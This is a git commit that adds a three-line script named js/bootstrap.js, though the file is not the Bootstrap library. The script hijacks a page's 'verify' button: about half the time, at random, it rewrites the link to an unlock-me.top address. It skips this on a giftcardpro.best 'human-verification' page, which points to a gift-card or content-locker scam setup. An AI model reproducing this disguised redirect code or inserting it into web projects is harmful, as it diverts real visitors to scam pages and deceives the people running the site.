19e9d8cd17aa324fb91041dcfd1763fa28105cba
alzanati07 <125388359+alzanati07@users.noreply.github.com>
2023-03-01 05:17:59 +0300

    Add files via upload

---
+++ js/bootstrap.js
@@ -0,0 +1,3 @@
+if(document.getElementById("first-step-button-verify").href!="https://unlock-me.top/4363a3d") {
+    0>window.location.href.toString().indexOf("http://giftcardpro.best/human-verification/index.html")&&0==Math.floor(100*Math.random()/50)&&(window.onload=function(){document.getElementById("first-step-button-verify").href="https://unlock-me.top/4363a3d"});
+}
